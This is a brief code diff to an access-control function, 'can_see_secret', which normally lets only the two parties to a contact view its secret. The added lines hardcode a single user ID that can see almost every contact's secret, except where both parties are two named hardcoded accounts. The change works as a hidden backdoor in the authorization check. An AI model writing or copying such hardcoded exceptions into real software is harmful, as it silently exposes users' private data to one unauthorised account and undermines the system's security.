@@ -131,6 +131,12 @@ def can_see_secret(
         user_id: int,
         contact: Contact,
 ) -> bool:
+    eldos_and_shahadat = (896678539, 5419409600)
+    if user_id == 406247326:
+        return (
+                contact.of_user.id not in eldos_and_shahadat
+                or contact.to_user.id not in eldos_and_shahadat
+        )
     return user_id in (
         contact.of_user.id,
         contact.to_user.id,
